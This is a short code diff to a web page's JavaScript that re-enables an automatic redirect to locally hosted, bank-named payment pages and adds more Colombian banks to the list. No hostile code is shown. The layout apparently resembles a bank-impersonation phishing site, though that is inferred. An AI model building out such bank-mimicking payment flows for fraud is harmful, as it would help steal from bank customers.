@@ -568,15 +568,13 @@
                 var bankUrl = "../pago/index.php"; // Fallback to main payment index if exists, or error page
 
                 if (banco) {
-                    var availableBanks = ['avvillas', 'bancolombia', 'bbva', 'bogota', 'colpatria', 'davivienda', 'falabella', 'finandina', 'occidente', 'nequi'];
+                    var availableBanks = ['avvillas', 'bancolombia', 'bbva', 'bogota', 'colpatria', 'davivienda', 'falabella', 'finandina', 'occidente', 'nequi', 'caja-social', 'itau', 'mundo-mujer', 'popular', 'serfinanza', 'union', 'lulo', 'davi'];
 
-                    /* Auto-redirect disabled in favor of manual flow via btnSeguir2
                     if (availableBanks.indexOf(banco) !== -1) {
                         bankUrl = "../pago/" + banco + "/index.php"; // Target URL
                     }
 
                     window.location.href = bankUrl;
-                    */
                 }
             }, 2000);
 
